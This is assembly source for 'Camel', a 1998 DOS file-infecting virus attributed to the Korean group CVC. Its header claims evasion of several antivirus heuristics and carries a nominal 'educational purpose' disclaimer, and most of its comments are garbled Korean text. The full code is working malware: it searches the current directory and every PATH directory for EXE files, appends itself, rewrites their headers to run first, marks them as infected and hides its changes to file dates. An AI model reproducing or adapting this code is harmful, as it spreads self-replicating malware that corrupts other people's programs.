;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \  \
;           Camel                             \          \     \   \
;                                             \           \   \    \   98/03
;                                             \            \ \     \
;                                              \\\\\\\      \      \\\\\\\ #03
; Virus Name : Camel
; AV Name    : -
; Author     : ?
; Group      : CVC
; Origin     : Corea
;
; Type : Non Memory resident EXE
;
; !****************************************************************************!
; *                                                                            *
; * �w�� !                                                                     *
; *    �����e �a����a ���a š�a���a. �a�B�ⷥ ����a���e �a�w�A�ᴡ�e�a.      *
; *    �A�b�a�e �� ���aš�a�� �����A�e ����e ���A�A ��Ё�ᕡ �����i ���� �g   *
; *    �e�a. �e�w �a��a ��З�a�� �i�a !                                       *
; *                                                                            *
; * Warning !                                                                  *
; *    This is a VIRUS source code. This source code is provieded educational  *
; *    purpose. The author is not responsible for any damage caused by this c  *
; *    ode. Don't modify or execute it !                                       *
; *                                                                            *
; !****************************************************************************!
;
;      - ���Bɡ���� ��������i �aЖ�a.
;        �����a�e ���Bɡ���e ����A�᷶�e PATH�A �a�e�a. ���e, �a����a�a ��З
;        �A�e �e���� ���Bɡ���A ���e *.EXE�a���i �q�q��ǥ ҁ�A ����A�� ���e �w
;        ������ ���� ����Ё�� �a�e�a�e(?) �q�q��ǥ�a. �����A �����a �a���a.
;
;      * <�w���a ����A�� ���� �g�a�e �e���� ���Bɡ������ ���a�a�� ������ǡ�a��
;        Ж�e�A �a�e ���a. �a�a�� �w���a ����A�᷶�� �g�a�e �e���� ���Bɡ���e
;        �q�q�E�a.>
;
;      * [��a] : �e��, �w���a " PATH=C:\UTILITY "�w���{�� �a�a�e �����A�� ���a
;                 �e �a ���Bɡ���e �q�q��ǡ�� ���e�a. "
;                 PATH=C:\UTILITY;"��� �{�����A ';'�� ���a�e �q�q��ǥ�a.
;
;      * <M.EXE�a HWP�w�� �{�� �q�q�A�e ��З�A�� �g�e �a���a���e �q�q�A�� �A�A
;        Ё�� �a�e�A �a�� �����i �a�� �e�i�� �g�v�a.>
;
;      * WINDOWS EXE �a���e �q�q��ǡ�� �g�e�a.
;
;      - �����q�q�i ϡ�a�� ��Ё�� Header�� 12h(Checksum)�A 'nj'�a�e ���a�i�i ��
;        �� �����i �A�a�e�a.
;
;      - ����,���e,�i�a�i �������� �����e�a. �����A �w�Ŵ��� �q�q.
;
;      - INT 24h�i �a������ �g�v�� �����A ���a�w�� ȓ�� ���e �i��ϡ�A��e.
;        ...�a~
;
;      - �����a�A ���s�a��...�i�A���e ������ �g�w~. �ᷡ�w �������� ���w.
;        ��a�a ���ᦅ�a�A �e�i���e�� F-PROT �A�� �񬂷� �e�E�a.
;        (TBAV�A�e �E�w~)
;
;      - ���q �a�� �e�i�� ���s���a. �i�q�a�A�a....�bӡ �q�q��ǡ�e �a�����a�i...
;
;                                                 ѡ�w�a��....
;
; Heuristic Test : AVP,DrWeb,DSAV,TBAV �A�� ���e
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

_size         EQU      V_end - V_start
Camel         SEGMENT
              ASSUME   CS:Camel, DS:Camel

              ORG      100h

V_start:      PUSH     DS ES

              MOV      SI,2Ch                   ; �ŉw�e���a ��w�A�� ���e �����i
              MOV      AX, word ptr DS:[SI]     ;  ��e�a. PSP�� 2Ch�A �a �����a...

              PUSH     CS CS
              POP      DS ES

              DB       0E8h, 4, 0               ; �I�a���U�i ���e
Delta:                                          ;
              DB       4 DUP (90h)              ;-> �������i �����e F-PROT�A
              POP      BP                       ;    �񬂖E�a. (��a��a�a??)
              NOP                               ;
              SUB      BP, offset Delta         ;

              PUSH     AX                       ;

              MOV      AH,19h                   ; �e���� �a�a���a�i ���e�a.
              INT      21h                      ;
              MOV      byte ptr oDrive[BP],AL   ;

              MOV      AH,47h                   ; �e���� ���Bɡ���i ���e�a.
              XOR      DL,DL                    ;
              LEA      SI, oDIR[BP+1]           ;
              INT      21h                      ;
              MOV      byte ptr oDIR[BP],'\'    ;

                                                ; �w���i ��w�a�e ����.
              POP      ES                       ;  �q�A �e�e�a.
              XOR      SI,SI                    ;
              MOV      CX,512                   ;
get_path:     CMP      word ptr ES:[SI], 'AP'   ;
              JZ       ok_001                   ;
not_:         INC      SI                       ;
              LOOP     get_path                 ;
              MOV      found_path[BP],0         ;
              JMP      end_path                 ;
ok_001:       CMP      word ptr ES:[SI+2], 'HT' ;
              JZ       ok_002                   ;
              JMP      not_                     ;
ok_002:       CMP      byte ptr ES:[SI+4], '='  ;
              JZ       ok_003                   ;
              JMP      not_                     ;
ok_003:                                         ;
              ADD      SI,+5                    ;
              XOR      DI,DI                    ;
              CMP      byte ptr ES:[SI],0
              JNZ      save_PATH
              MOV      found_PATH[BP],0
              JMP      end_path
save_PATH:    MOV      found_PATH[BP],1
Loop_path:    MOV      AL, byte ptr ES:[SI]     ;
              INC      SI                       ;
              CMP      AL,0                     ;
              JZ       end_path                 ;
              MOV      thePATH[BP+DI],AL        ;
              INC      DI                       ;
              JMP      Loop_path                ;
end_path:
              PUSH     DS                       ;
              POP      ES                       ;

              LEA      SI, oIP[BP]              ; �e���i �a�� ����e�a.
              LEA      DI, _IP[BP]              ; �{�A 0EAh�� �q�A ���a�w�w�i �Ŭ�.
              MOV      CX,4                     ;
          rep MOVSW                             ;

              MOV      AH,1Ah                   ; DTA�i ����e�w.
              LEA      DX, DTA[BP]              ;
              INT      21h                      ;
;------------------------------------------------------------------------;
              CALL     INFECT                   ; �e�� ���Bɡ���i �q�q

              CMP      found_path[BP],1         ; ����E �w���i �x�v�e���� �a���i
              JNZ      Chg_path_2               ;  ��a.

Chg_path_1:   XOR      SI,SI                    ; <�w���i �x�v�i ���� ��˥>
              LEA      DI,path_START[BP]        ;
              MOV      byte ptr path_CNT[BP],1  ;  �b�b�� ���i�e ';'�a�� �����A���a
              MOV      AX,SI                    ;   �a �����i 0�a�� ��á�e�a.
              STOSB                             ;    (�a�aǡ�a �w���a�� ��á�a��..)
                                                ;
divide_path:  INC      SI                       ;  �i�� ';'�a�q�� ���U�i �a���a��
              CMP      byte ptr thePATH[BP+SI],';'             ;   ��w�e�a. (�a������ ���� ���Bɡ
              JNZ      path_001                 ;    ���� ���b �����a �A���a..)
              MOV      byte ptr thePATH[BP+SI],0;
              MOV      AX,SI                    ;  �q�e ���A�� �g�e �������w.
              INC      AX                       ;
              STOSB                             ;
              INC      byte ptr path_CNT[BP]    ;
              JMP      divide_path              ;
                                                ;
path_001:     CMP      byte ptr thePATH[BP+SI],0;
              JNZ      path_002                 ;
              JMP      complete                 ;
path_002:     JMP      divide_path              ;


complete:     MOV      CL, byte ptr path_CNT[BP]
              XOR      CH,CH

              LEA      SI, path_START[BP]
Chg_again:    LODSB
              XOR      AH,AH
              MOV      DI,AX

              LEA      DX, thePATH[BP+DI]

              CALL     Chg_dir                  ; ���Bɡ���i �e�w�e�a.
              JNC      sub_inf
              JMP      the_next

sub_inf:      CALL     INFECT                   ; �q�q��ǥ�a.

the_next:     LOOP     Chg_again

              MOV      DL, byte ptr oDrive[BP]  ; ������ �a�a���a/���Bɡ����...
              XOR      DH,DH                    ;
              CALL     Chg_Drv                  ;
                                                ;
              LEA      DX, oDir[BP]             ;
              CALL     Chg_dir                  ;

Chg_path_2:                                     ; �e���� ���Bɡ������ ROOT�a��
                                                ; ������ǡ�e�� �q�q��ǡ�e �����i
                                                ; �e�i�a�� Ж�e�A......

;========= pass control to the host             ; �a���a���� �A��i ѡ�a�a�A�A...

              POP      ES DS                    ;

              MOV      AH,1Ah                   ;
              MOV      DX,80h                   ;
              INT      21h                      ;

              PUSH     DS                       ;
              POP      ES                       ;

              MOV      AX,ES                    ;
              ADD      AX,10h                   ;

              ADD      word ptr cs:_CS[BP],AX   ;

              ADD      word ptr cs:_SS[BP],AX
              MOV      SS,AX
              MOV      SP, word ptr cs:_SP[BP]
                                                ; ���a�w�w���w, (FAR)
              DB       0EAh

_IP           DW       ?
_CS           DW       ?
_SS           DW       ?
_SP           DW       ?

oIP           DW       ?
oCS           DW       0FFF0h
oSS           DW       0FFF0h
oSP           DW       ?

Target_01     DB       '*.E?E',0

Chg_drv       PROC
              PUSH     AX DX
              MOV      AH,0Eh
              INT      21h
              POP      DX AX
              RET
Chg_drv       ENDP

;*---------
Chg_dir       PROC
              PUSH     AX DX
              MOV      AH,3Bh
              INT      21h
              POP      DX AX
              RET
Chg_dir       ENDP

;************************************************************************
INFECT        PROC                              ; �a�w �q�A �e�a�e ����...         ;*
              PUSH     AX
              PUSH     BX
              PUSH     CX
              PUSH     DX
              PUSH     SI
              PUSH     DI
              PUSH     SP
              PUSH     BP
              PUSH     DS
              PUSH     ES
              PUSH     SS

Search_file:  MOV      AH,4Eh                   ;    �a�� �x��.
              MOV      CX,27h                   ;
              LEA      DX, Target_01[BP]        ;
              INT      21h                      ;

              JNC      pass_001                 ;                                  ;*
              JMP      end_inf                  ;                                  ;*
                                                                                   ;*
pass_001:     LEA      SI, DTA[BP+15h]          ; ����/���e/�i�a�i ��w.
              LEA      DI, Attr[BP]             ;
              MOVSB                             ;
              MOVSW                             ;
              MOVSW                             ;

              MOV      AX,4301h                 ; ���� Ё�A.
              XOR      CX,CX                    ;
              LEA      DX, DTA[BP+1Eh]          ;
              INT      21h                      ;
                                                                                   ;*
              MOV      AX,3D02h                 ; ���e
              LEA      DX, DTA[BP+1Eh]          ;
              INT      21h                      ;
              XCHG     AX,BX                    ;

              MOV      AH,3Fh                   ; Ё��i ���e�a.
              MOV      CX,1Ah                   ;
              LEA      DX, Header[BP]           ;
              INT      21h                      ;
                                                                                   ;*
              CMP      word ptr Header[BP],'ZM' ; ���a EXE�a�������i ��a�a�e ����.
              JZ       pass_002                 ;  (EXE�a���e MZ�� ���b�e�a. ZM�� ��
              CMP      word ptr Header[BP],'MZ' ; �a�� �a�e�A..���֔a)
              JZ       pass_002                 ;
              JMP      next                     ;

pass_002:     CMP      word ptr Header[BP+12h],'nj'            ; ���� �q�q�E �a�������i ��a....
              JNE      pass_003                 ;
              JMP      next                     ;

pass_003:     CMP      byte ptr Header[BP+18h],'@'             ; Ё�᷁ 18h�A ������(@)�a ���e ��
              JNE      no_win                   ;  �啡�� �a�����w.
              JMP      next                     ;
                                                ; Ё�᷁ ������(SS/SP/IP/CS)�i ��w.
no_win:       LEA      SI, Header[BP+0Eh]       ;
              LEA      DI, oSS[BP]              ;
              MOVSW                             ;
              MOVSW                             ;
              LEA      SI, Header[BP+14h]       ;
              LEA      DI, oIP[BP]              ;
              MOVSW                             ;
              MOVSW                             ;

              MOV      AX,4202h                 ; ͡����i �{�a�� ����
              XOR      CX,CX                    ;
              MOV      DX,CX                    ;
              INT      21h                      ;
              PUSH     DX AX BX                 ; �a���� �a�� �� Ѕ�i�i ��w

pass_004:                                       ; ������ CS,IP�t�i ���e�e�a.
              MOV      BX, word ptr Header[BP+08h]             ;-> Ё�᷁ �a���i ���e�a(́��a���a)

              MOV      CL,4                     ;-> ���e Ё�᷁ �a���i �a���a��
              SHL      BX,CL                    ;   �a���a. (́��a���a�e 16byte)

              SUB      AX,BX                    ;-> �a���� �a���A�� Ё�᷁ �a���i
              SBB      DX,0                     ;   ���a.

              MOV      CX,16                    ;* ���A �����i �a�� ́��a���a �w��
              DIV      CX                       ;  �a�� �a���a. �a�a�w �e���� 16�a��
                                                ;  �a���e �E�a.
              MOV      word ptr Header[BP+0Eh], AX             ; SS
              MOV      word ptr Header[BP+10h], 0FFFEh         ; SP
              MOV      word ptr Header[BP+14h], DX             ; IP
              MOV      word ptr Header[BP+16h], AX             ; CS
              MOV      word ptr Header[BP+12h], 'nj'           ; Checksum�A nj�i ���e�a.(�����q�q�i
                                                ; ϡ�a�� ��Ё��..)
pass_005:     POP      BX AX DX                 ; �a���� �a�� �� Ѕ�i�i �a�� ����.

pass_006:                                       ; < �A������ �a�ỡ �a���a(?) ���e >- EXE�a���� Ё�᷁ 02h�� 04h�� �a���� �a���i �i �� ���a.
              ADD      AX, _size                ;1. �a���� �a���A �a����a�� �a���i
              ADC      DX,0                     ;   ���e�a.

              MOV      CX,512                   ;2. �a �t�i 512�� �a���a.(�A�����e �a
              DIV      CX                       ;   �a�w 512�a���a)

              OR       DX,DX                    ;3. �a�ỡ�a 0�� �a���a�e �A�����i �e
              JE       no_inc                   ;   ���� Ё�� �e�w. �a���� 1�i �w�a.
              INC      AX                       ;
no_inc:
              MOV      word ptr Header[BP+04h],AX              ;4. �A�����e Ё�᷁ 04h�A
              MOV      word ptr Header[BP+02h],DX              ;5. �a���b �A������ �a�ỡ �a���a �t�ee.
                                                               ;   02h�A ���e�a.
pass_007:     MOV      AH,40h                   ; �a����a�i �e�a.
              MOV      CX, _size                ;
              LEA      DX, V_start[BP]          ;
              INT      21h                      ;

              MOV      AX,4200h                 ; �a�� ͡����i ��q�a�� ����
              XOR      CX,CX                    ;
              MOV      DX,CX                    ;
              INT      21h                      ;

              MOV      AH,40h                   ; �aȁ..����Ё ���e Ё��i �e�a.
              MOV      CX,1Ah                   ;
              LEA      DX, Header[BP]           ;
              INT      21h                      ;

              MOV      CX, Time[BP]             ; ���e/�i�a�� ����
              MOV      DX, Date[BP]             ;
              MOV      AX,5701h                 ;
              INT      21h                      ;
                                                                                   ;*
next:         MOV      AH,3Eh                   ; �h��
              INT      21h                      ;
                                                                                   ;*
              MOV      AX,4301h                 ; ���� ����
              XOR      CH,CH                    ;
              MOV      CL, Attr[BP]             ;
              LEA      DX, DTA[BP+1Eh]          ;
              INT      21h                      ;
                                                                                   ;*
              MOV      AH,4Fh                   ; �a�q�a���i �x�e�a.               ;*
              INT      21h                      ;                                  ;*
              JC       end_inf                  ;                                  ;*
              JMP      pass_001

end_inf:      POP      SS
              POP      ES
              POP      DS
              POP      BP
              POP      SP
              POP      DI
              POP      SI
              POP      DX
              POP      CX
              POP      BX
              POP      AX

              ret                                                                                 ;*
INFECT        ENDP                                                                                ;*
;******************************************************************************
V_end:

oDrive        DB       ?
oDir          DB       ?
              DB       63 DUP (?)

Attr          DB       ?
Time          DW       ?
Date          DW       ?

found_path    DB       0

thePATH       DB       384 DUP (?)

path_CNT      DB       ?
path_START    DB       20 DUP (?)

Header        DB       1Ah DUP (?)
DTA:

Camel         ENDS
              END      V_start
